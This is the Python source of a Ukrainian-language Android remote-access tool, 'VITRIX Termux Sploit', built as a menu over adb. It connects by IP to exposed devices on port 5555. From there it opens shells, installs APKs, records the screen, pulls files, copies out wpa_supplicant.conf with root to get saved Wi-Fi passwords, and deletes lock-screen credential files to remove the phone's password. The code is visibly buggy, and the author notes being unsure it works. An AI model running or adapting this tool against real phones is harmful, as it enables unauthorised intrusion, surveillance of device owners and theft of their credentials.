#!/usr/bin/python
#-*- coding: utf-8 -*-
#Developer by company VITRIX
import os
import sys
import readline
import random
import time as  t

def autocomplete(text, state):
    import readline
    line = readline.get_line_buffer()
    splitted = line.lstrip().split(" ")

    # no space, autocomplete will be the basic commands:
    options = [x + " " for x in actions if x.startswith(text)]
    options.extend([x + " " for x in remap if x.startswith(text)])
    try:
        return options[state]
    except:
        return None

def get_input(prompt, auto_complete_fn=None, basefile_fn=None):
    try:
        if auto_complete_fn != None:
            import readline
            readline.set_completer_delims(' \t\n;/')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(auto_complete_fn)
    except Exception as e:
        pass

    cmd = input("%s" % prompt)
    return cmd.strip()

CurrentDir = os.path.dirname(os.path.abspath(__file__))
readline.set_completer(autocomplete)
readline.parse_and_bind("tab: complete")
WHSL = '\033[1;32m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
GNSL = '\033[1;34m'
load_count = 0
page2 = False

arrow = REDL + "└──>" + WHSL
arrow = str(" "+arrow)
connect = REDL + "│" + WHSL

page_1 = '''{2}
 {2} [ {1}VITRIX Termux Sploit{0} Alfa 1.5 {2}]{0} 
            _  __                          ____            _         
           | |/ /   _ _ ____      ____ _  |  _ \  ___  ___| | ____ _ 
           | ' / | | | '__\ \ /\ / / _` | | | | |/ _ \/ __| |/ / _` |
           | . \ |_| | |   \ V  V / (_| | | |_| |  __/\__ \   < (_| |
           |_|\_\__,_|_|    \_/\_/ \__,_| |____/ \___||___/_|\_\__,_|

  ---------------------------------------------------------------------

 {2} [ {1}Dev{0}  {2}]{2}
 {2} [ {1}Github{0} https://github.com/The-company-VITRIX/kurwa-deska-ADB {2}]{2}
 {2} [ {1}Telegram{0} канала нема {2}]{2}
  
  {0}[{1} 1 {0}]{2}  Показати підключенні прилади
  {0}[{1} 2 {0}]{2}  відключити всі прилади
  {0}[{1} 3 {0}]{2}  відключити новий прилад
  {0}[{1} 4 {0}]{2}  Доступ через shell
  {0}[{1} 5 {0}]{2}  встановіть apk на на android
  {0}[{1} 6 {0}]{2}  Screen record a device
  {0}[{1} 7 {0}]{2}  Get device screenshot
  {0}[{1} 8 {0}]{2}  Перезапустіть VITRIX Sploit
  {0}[{1} 9 {0}]{2}  Вилучити файли з телефона
  {0}[{1} 10 {0}]{2} Включити телефон
  {0}[{1} 11 {0}]{2} Видалити програму
  {0}[{1} 12 {0}]{2} Журнал телефона
  {0}[{1} 13 {0}]{2} Dump System Info
  {0}[{1} 14 {0}]{2} Список всіх програм
  {0}[{1} 15 {0}]{2} Запустити програму
  {0}[{1} 16 {0}]{2} Port Forwarding
  {0}[{1} 17 {0}]{2} Grab wpa_supplicant
  {0}[{1} 18 {0}]{2} Show Mac/Inet
  {0}[{1} 19 {0}]{2} Забрати apk
  {0}[{1} 20 {0}]{2} Get Battery Status
  {0}[{1} 21 {0}]{2} Get Network Status
  {0}[{1} 22 {0}]{2} Включити / виключити Wi-Fi
  {0}[{1} 23 {0}]{2} Удалити пароль телефона
  {0}[{1} 24 {0}]{2} Эмуляція нажаття кнопок
  {0}[{1} 25 {0}]{2} Получити текущу активність
  
  {0}[{1} R {0}]{2}  Вийти і відключити adb server
  {0}[{1} 0 {0}]{2}  Очистити термінал
 
'''.format(GNSL, REDL, WHSL)

page_2 = '''\n
'''.format(GNSL, REDL, WHSL)

def main():
    print (("\n{1}  [{0} + {1}]{2} Твоя база данних, уязвимих приладів.").format(REDL, GNSL, WHSL))
    print()
    os.system("adb devices -l")
    os.system("adb tcpip 5555")
    page_num = 1
    print()
    option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")
    print("")
        
    while(1):
        
        if option == '1':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} └──> Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb devices -l")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+" ["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option  ==  '2':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb disconnect")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '3':
            print(("\n{1} [{0} + {1}]{2} Введіть IP address.").format(REDL, GNSL, WHSL))
            print()
            try:
                device_name = input (arrow+" Android Debug Bridge"+GNSL+"("+REDL + "connect_device" + GNSL + ")"+ENDL + " : ")
            except KeyboardInterrupt:
                main()
            if device_name == '':
                main()
            if device_name == '27':
                main()
                
            os.system("adb connect "+device_name+":5555")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option  == '4':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '5':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Введіть локацію apk.  Приклад /home/salita/Desktop/test.apk.").format(REDL, GNSL, WHSL))
            apk_location = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "apk_install" + GNSL + ")"+ENDL + "> ")
           
            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system("adb -s  "+device_name+" install "+apk_location)
            
            os.chdir(g)

            print(GNSL  +  "Apk був встановлений.")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option ==  '6':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0} + {1}]{2} Запис відео начався.").format(REDL, GNSL, WHSL))
            print(("     "+connect))
            os.system("adb -s "+device_name+" shell screenrecord /sdcard/screen.mp4")
            print(("    {1} [{0} + {1}]{2} Укажіть, де ви хочете зберегти відео.").format(REDL, GNSL, WHSL))
            place_location = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "screen_record" + GNSL + ")"+ENDL + "> ")
            
            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system("adb -s "+device_name+" pull /sdcard/screen.mp4 "+place_location)
            
            os.chdir(g)

            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option  == '7':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Укажіть, де ви хочете зберегти знімок єкрана.").format(REDL, GNSL, WHSL))
            place_location = input("    "+arrow + "Android Debug Bridge"+GNSL+"("+REDL + "screenshot" + GNSL + ")"+ENDL + "> ")

            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
            
            os.chdir(g)

            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '8':
            print(("{1} [{0} + {1}]{2} Restarting Server...{3}").format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            os.system("adb start-server >> /dev/null")
            t.sleep(4)
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '9':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені..").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Введіть де є файл на телефоні.").format(REDL, GNSL, WHSL))
            file_location = input("    "+arrow + "Android Debug Bridge"+GNSL+"("+REDL + "file_pull" + GNSL + ")"+ENDL + "> ")
            print(("        "+connect))
            print(("       {1} [{0} + {1}]{2} Укажіть, де ви хочете зберегти файл.").format(REDL, GNSL, WHSL))
            place_location = input("       "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "file_pull" + GNSL + ")"+ENDL + "> ")
            
            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
 
            os.chdir(g)

            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '10':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+ " reboot ")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option ==  '11':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "app_delete" + GNSL + ")"+ENDL + "> ")
            os.system("adb -s "+device_name+" unistall "+package_name)
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '12':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system('adb -s '+device_name+" logcat ")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '13':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell dumpsys")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '14':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell pm list packages -f")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '15':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "app_run" + GNSL + ")"+ENDL + "> ")
            os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '16':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Введіть порт на телефоні.").format(REDL, GNSL, WHSL))
            port_device = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "port_forward" + GNSL + ")"+ENDL + "> ")
            print(("         "+connect))
            print(("        {1} [{0} + {1}]{2} Enter a port to forward it too.").format(REDL, GNSL, WHSL))
            forward_port = input("        "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "port_forward" + GNSL + ")"+ENDL + "> ")
            os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '17':
            try:
                print(("     "+connect))
                print(("    {1} [{0} + {1}]{2} Укажіть, де ви хочете зберегти файл.").format(REDL, GNSL, WHSL))
                location = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "wpa_grub" + GNSL + ")"+ENDL + "> ")
                
                w = os.environ['OLDPWD']
                os.chdir(w)

                os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)

                os.chdir(g)

                option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

            except KeyboardInterrupt:
                try:
                    device_name
                except:
                    print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                    main()
                    
                option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '18':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell ip address show wlan0")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '19':
            try:
                device_name
            except:
                print(("{1} [{0} + {1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1} [{0} + {1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+ENDL + "> ")
            os.system("adb -s "+device_name+" shell pm path "+package_name)
            print(("         "+connect))
            print(("        {1}[{0}+{1}]{2} Введіть путь к apk.").format(REDL, GNSL, WHSL))
            path = input("        "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+ENDL + "> ")
            print(("             "+connect))
            print(("            {1}[{0}+{1}]{2} Введіть місце хранения apk.")  .format(REDL, GNSL, WHSL))
            location =   input("            "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+ENDL + "> ")
       
            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system("adb -s " +device_name+" pull "+path+" "+location)
            
            os.chdir(g)
            
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '20':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell dumpsys battery")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '21':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell netstat")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '22':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Щоб знову включити WiFi, прилад  має бути подключений.").format(REDL, GNSL, WHSL))
            print(("     "+connect))
            on_off = input(GNSL + "    ["+REDL+"+"+GNSL+"]"+WHSL+" Хочете включити/виключити WiFi on/off")
            if on_off == 'off':
                command = " shell svc wifi disable"
            else:
                command = " shell svc wifi enable"

            os.system("adb -s "+device_name+command)
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '23':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(REDL + "****************** REMOVING PASSWORD ******************")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
            print(REDL + "****************** REMOVING PASSWORD ******************")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '24':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} Прилади не підключені.").format(REDL, GNSL, WHSL))
                main()
            print('''
 0   -->  KEYCODE_UNKNOWN
 1   -->  KEYCODE_MENU
 2   -->  KEYCODE_SOFT_RIGHT
 3   -->  KEYCODE_HOME
 4   -->  KEYCODE_BACK
 5   -->  KEYCODE_CALL
 6   -->  KEYCODE_ENDCALL
 7   -->  KEYCODE_0
 8   -->  KEYCODE_1
 9   -->  KEYCODE_2
 10  -->  KEYCODE_3
 11  -->  KEYCODE_4
 12  -->  KEYCODE_5
 13  -->  KEYCODE_6
 14  -->  KEYCODE_7
 15  -->  KEYCODE_8
 16  -->  KEYCODE_9
 17  -->  KEYCODE_STAR
 18  -->  KEYCODE_POUND
 19  -->  KEYCODE_DPAD_UP
 20  -->  KEYCODE_DPAD_DOWN
 21  -->  KEYCODE_DPAD_LEFT
 22  -->  KEYCODE_DPAD_RIGHT
 23  -->  KEYCODE_DPAD_CENTER
 24  -->  KEYCODE_VOLUME_UP
 25  -->  KEYCODE_VOLUME_DOWN
 26  -->  KEYCODE_POWER
 27  -->  KEYCODE_CAMERA
 28  -->  KEYCODE_CLEAR
 29  -->  KEYCODE_A
 30  -->  KEYCODE_B
 31  -->  KEYCODE_C
 32  -->  KEYCODE_D
 33  -->  KEYCODE_E
 34  -->  KEYCODE_F
 35  -->  KEYCODE_G
 36  -->  KEYCODE_H
 37  -->  KEYCODE_I
 38  -->  KEYCODE_J
 39  -->  KEYCODE_K
 40  -->  KEYCODE_L
 41  -->  KEYCODE_M
 42  -->  KEYCODE_N
 43  -->  KEYCODE_O
 44  -->  KEYCODE_P
 45  -->  KEYCODE_Q
 46  -->  KEYCODE_R
 47  -->  KEYCODE_S
 48  -->  KEYCODE_T
 49  -->  KEYCODE_U
 50  -->  KEYCODE_V
 51  -->  KEYCODE_W
 52  -->  KEYCODE_X
 53  -->  KEYCODE_Y
 54  -->  KEYCODE_Z
 55  -->  KEYCODE_COMMA
 56  -->  KEYCODE_PERIOD
 57  -->  KEYCODE_ALT_LEFT
 58  -->  KEYCODE_ALT_RIGHT
 59  -->  KEYCODE_SHIFT_LEFT
 60  -->  KEYCODE_SHIFT_RIGHT
 61  -->  KEYCODE_TAB
 62  -->  KEYCODE_SPACE
 63  -->  KEYCODE_SYM
 64  -->  KEYCODE_EXPLORER
 65  -->  KEYCODE_ENVELOPE
 66  -->  KEYCODE_ENTER
 67  -->  KEYCODE_DEL
 68  -->  KEYCODE_GRAVE
 69  -->  KEYCODE_MINUS
 70  -->  KEYCODE_EQUALS
 71  -->  KEYCODE_LEFT_BRACKET
 72  -->  KEYCODE_RIGHT_BRACKET
 73  -->  KEYCODE_BACKSLASH
 74  -->  KEYCODE_SEMICOLON
 75  -->  KEYCODE_APOSTROPHE
 76  -->  KEYCODE_SLASH
 77  -->  KEYCODE_AT
 78  -->  KEYCODE_NUM
 79  -->  KEYCODE_HEADSETHOOK
 80  -->  KEYCODE_FOCUS
 81  -->  KEYCODE_PLUS
 82  -->  KEYCODE_MENU
 83  -->  KEYCODE_NOTIFICATION
 84  -->  KEYCODE_SEARCH
 85  -->  TAG_LAST_KEYCODE
            ''')
            print(("{1}[{0}+{1}]{2} Введіть номер опції.").format(REDL, GNSL, WHSL))
            num = input(arrow + " Android Debug Bridge"+GNSL+"("+REDL + "keycode" + GNSL + ")"+ENDL + "> ")
            os.system("adb -s "+device_name+" shell input keyevent "+num)
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")
            
  
        elif option == '25':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} прилади ще не підключені.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell dumpsys activity")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

        elif option == '26':
            handle = open ('text.txt')
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")
            

        elif option == '0':
            global page1
            if page1 == True:
                clear(page_1)
                option = raw_input(ENDL + "└──> Android Debug Bridge"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")
            else:
                clear(page_1)
                option = raw_input(ENDL + "└──> Android Debug Bridge"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+ENDL + "> ")

            
        elif option == 'R':
            print(("{1}[{0}+{1}]{2} Stopping sploit server and exit...{3}").format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            t.sleep(4)
            exit()
            break
        else:
            print("Android Debug Bridge: Помилка: invalid command")
            option = input(ENDL + "  └──> Android Debug Bridge"+GNSL+"["+REDL + "main_menu" + GNSL + "]"+ENDL + " :")

    main()
     
import os
os.system("printf '\033]2;Android Remote Access\a'")
print((" {1}[{0} + {1}]{2} Запуск ADB сервера...").format(REDL, GNSL, WHSL))
print("Не знаю чи працює")
g = os.environ['HOME'] + '/VITRIV ADB'
os.system("adb tcpip 5555 >> /dev/null")
t.sleep(4)
os.system('clear')
print(page_1)
main()
